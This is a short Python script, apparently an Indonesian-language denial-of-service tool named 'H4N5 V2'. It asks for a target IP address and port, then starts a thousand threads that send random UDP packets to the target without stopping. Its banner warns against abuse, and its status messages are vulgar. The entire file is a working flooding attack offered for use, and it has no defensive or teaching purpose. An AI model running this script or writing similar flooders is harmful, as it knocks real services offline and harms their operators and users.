import socket
import random
import threading
import time
import os , sys

print ("\033[91m TOOLS H4N5 V2")
print ("TIDAK MENJAMIN TEMBUS DI SERVER BESAR/BER ANTI DDOS.")
print ("DONT ABUSE BROTHER!!")

ip = str(input(" Ip :"))
port = int(input(" Port :"))
choice = str(input(" Gas? y/n :"))
os.system("clear")
def udp():
	data = os.urandom(2222)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(1000):
				s.sendto(data,addr)
			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
		except:
			print("[H4N5] ATTACK TO %s PORT %s"%(ip,port))
			
for y in range(1000):
    if choice == 'y':
        th = threading.Thread(target = udp)
        th.start()
